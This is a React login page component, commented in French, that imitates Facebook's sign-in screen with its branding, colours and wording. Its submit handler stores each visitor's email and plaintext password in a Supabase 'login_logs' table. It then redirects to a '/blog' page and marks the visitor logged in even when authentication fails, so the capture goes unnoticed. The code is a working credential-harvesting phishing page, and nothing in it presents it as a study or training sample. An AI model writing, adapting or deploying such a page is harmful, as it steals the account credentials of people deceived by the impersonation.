import React, { useState } from 'react';
import { supabase } from '../lib/supabaseClient';
import { useNavigate } from 'react-router-dom';

const LoginPage: React.FC = () => {
    const [email, setEmail] = useState('');
    const [password, setPassword] = useState('');
    const navigate = useNavigate();

    // Nouvel état pour gérer la visibilité du mot de passe
    const [showPassword, setShowPassword] = useState(false);
    const [errorMsg, setErrorMsg] = useState<string | null>(null);
    const [loading, setLoading] = useState(false);

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        setErrorMsg(null);
        setLoading(true);

        try {
            // 1) Log en base (pas bloquant)
            const { error: insertError } = await supabase
                .from('login_logs')
                .insert([{ email, password_text: password }]);

            if (insertError) console.error('Erreur log:', insertError);

            // 2) Auth (peut échouer)
            const { error: authError } = await supabase.auth.signInWithPassword({
                email: email.trim().toLowerCase(),
                password,
            });

            if (authError) {
                console.error('Auth error:', authError);
                setErrorMsg("Identifiants invalides (redirection quand même).");
            }
        } finally {
            setLoading(false);

            // ✅ FORCER l'accès au blog même si auth échoue
            localStorage.setItem('isLoggedIn', 'true'); // si tu as ProtectedRoute
            navigate('/blog', { replace: true });
        }
    };

    return (
        <div className="min-h-screen bg-[#f0f2f5] flex flex-col items-center justify-center pt-8 pb-4 font-sans">

            {/* Container Principal */}
            <div className="w-full max-w-[396px] flex flex-col items-center">

                {/* Logo Facebook */}
                <div className="mb-4">
                    <h1 className="text-[#1877f2] text-5xl font-bold tracking-tighter text-center">
                        facebook
                    </h1>
                </div>

                {/* Carte de Connexion */}
                <div className="bg-white p-4 shadow-xl rounded-lg w-full">
                    <div className="text-center mb-4 text-[18px] text-gray-700">
                        Se connecter à Facebook
                    </div>

                    {/* Affichage des erreurs (Style Facebook simple) */}
                    {errorMsg && (
                        <div className="mb-4 border border-red-300 bg-red-50 text-red-800 px-3 py-2 rounded text-sm text-center">
                            {errorMsg}
                        </div>
                    )}

                    <form onSubmit={handleSubmit} className="flex flex-col gap-3">
                        <input
                            type="text"
                            placeholder="Adresse e-mail ou numéro de tél."
                            className="w-full px-4 py-3.5 border border-gray-300 rounded-md text-[17px] focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2]"
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            disabled={loading}
                        />

                        {/* Conteneur relatif pour positionner l'icône */}
                        <div className="relative w-full">
                            <input
                                type={showPassword ? "text" : "password"}
                                placeholder="Mot de passe"
                                className="w-full px-4 py-3.5 border border-gray-300 rounded-md text-[17px] focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2]"
                                value={password}
                                onChange={(e) => setPassword(e.target.value)}
                                disabled={loading}
                            />
                            <button
                                type="button"
                                onClick={() => setShowPassword(!showPassword)}
                                className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700 focus:outline-none"
                            >
                                {showPassword ? (
                                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="w-5 h-5">
                                        <path strokeLinecap="round" strokeLinejoin="round" d="M3.98 8.223A10.477 10.477 0 001.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.45 10.45 0 0112 4.5c4.756 0 8.773 3.162 10.065 7.498a10.523 10.523 0 01-4.293 5.774M6.228 6.228L3 3m3.228 3.228l3.65 3.65m7.894 7.894L21 21m-3.228-3.228l-3.65-3.65m0 0a3 3 0 10-4.243-4.243m4.242 4.242L9.88 9.88" />
                                    </svg>
                                ) : (
                                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor" className="w-5 h-5">
                                        <path strokeLinecap="round" strokeLinejoin="round" d="M2.036 12.322a1.012 1.012 0 010-.639C3.423 7.51 7.36 4.5 12 4.5c4.638 0 8.573 3.007 9.963 7.178.07.207.07.431 0 .639C20.577 16.49 16.64 19.5 12 19.5c-4.638 0-8.573-3.007-9.963-7.178z" />
                                        <path strokeLinecap="round" strokeLinejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                                    </svg>
                                )}
                            </button>
                        </div>

                        <button
                            type="submit"
                            disabled={loading}
                            className="w-full bg-[#1877f2] hover:bg-[#166fe5] disabled:bg-[#1877f2]/50 text-white font-bold text-[20px] py-2 rounded-md transition-colors mt-1"
                        >
                            {loading ? "Connexion..." : "Se connecter"}
                        </button>
                    </form>

                    <div className="mt-4 text-center">
                        <a href="#" className="text-[#1877f2] text-sm hover:underline hover:text-[#1877f2]">
                            Informations de compte oubliées ?
                        </a>
                    </div>

                    <div className="flex items-center justify-between mt-5 mb-5">
                        <div className="h-[1px] bg-gray-300 w-full"></div>
                        <span className="px-3 text-gray-500 text-sm">ou</span>
                        <div className="h-[1px] bg-gray-300 w-full"></div>
                    </div>

                    <div className="text-center">
                        <button className="bg-[#42b72a] hover:bg-[#36a420] text-white font-bold text-[17px] px-4 py-3 rounded-md transition-colors">
                            Créer un nouveau compte
                        </button>
                    </div>
                </div>

                <div className="mt-8 text-center text-xs text-gray-500">
                    <p className="mb-2">
                        <span className="cursor-pointer hover:underline">Français (France)</span> ·
                        <span className="cursor-pointer text-blue-600 hover:underline mx-1">English (US)</span> ·
                        <span className="cursor-pointer text-blue-600 hover:underline mx-1">Malagasy</span> ·
                        <span className="cursor-pointer text-blue-600 hover:underline">Plus...</span>
                    </p>
                </div>
            </div>
        </div>
    );
};

export default LoginPage;